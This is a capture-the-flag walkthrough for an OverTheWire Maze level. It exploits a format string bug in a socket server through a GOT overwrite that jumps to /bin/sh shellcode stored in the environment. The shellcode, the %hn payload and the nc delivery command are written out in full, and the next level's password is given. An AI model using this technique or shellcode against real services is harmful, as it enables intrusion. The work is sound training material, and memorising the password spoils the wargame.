
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> This level runs a **socket server on port 1337** that receives input and sends a reply. If the input matches `"god"`, it sends a generic message. If not, it executes `snprintf()` with your input as the format string — making it vulnerable to a **format string exploit**.

---

### 🧠 Concepts Covered:

- 🧵 Socket communication
    
- 🧩 Format string exploitation (`%n`, `%hn`)
    
- 📌 GOT overwrite to redirect execution
    
- 🐚 Shellcode in environment
    

---

### 🔎 Binary Summary

```c
if (strcmp(buf, "god") == 0) {
    strcpy(replybuf, "Yup... go away");
} else {
    snprintf(replybuf, 512, buf);     // ⚠️ Format string vuln!
    strcat(replybuf, " is wrong ^_^");
}
send(client_sock, replybuf, strlen(replybuf), 0);
```

✅ Since the format string is **not sanitized**, and our input becomes its format string, we can use `%n` or `%hn` to write arbitrary values.

---

### 🧪 Exploit Plan

1. Find the GOT address of a function like `strlen@GOT`
    
2. Overwrite it to point to **our shellcode in env**
    
3. Trigger a call to that function (indirectly or by alignment)
    
4. Shell executes
    

---

### ⚙️ Shellcode Setup

#### 📜 1. Export shellcode to env:

```bash
export SC=$(python3 -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
"\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

🧠 Shellcode location: `0xffffdf0c`

---

### 🧠 Memory Addressing

Assume `strlen@GOT = 0x08049d34`

We'll split `0xffffdf0c` into:

- **Lower bytes (LO):** `0xdf0c`
    
- **Higher bytes (HI):** `0xffff`
    

Then we’ll write it to:

- `0x08049d34` (LO)
    
- `0x08049d36` (HI)
    

---

### 📜 2. Craft Format String Payload

```bash
python3 -c 'print(
  "\x34\x9d\x04\x08" +     # addr of GOT (LO)
  "\x36\x9d\x04\x08" +     # addr of GOT+2 (HI)
  "%57092x%1$hn" +         # write LO (0xdf0c)
  "%8435x%2$hn"            # write HI (0xffff)
)' | nc localhost 1337
```

> Calculations:

- `0xdf0c = 57092`
    
- `0xffff - 0xdf0c = 8435`
    
- `$1`, `$2` are argument positions for addresses on the stack
    

---

### 🧪 Trigger

In one terminal:

```bash
/maze/maze7
```

In another:

```bash
python3 ... | nc localhost 1337
```

🧨 When `snprintf()` is called, our payload overwrites `strlen()` GOT entry → control jumps to shellcode → shell spawns!

---

### 🔑 Password for Maze Level 8:

```
jopieyahng
```

---
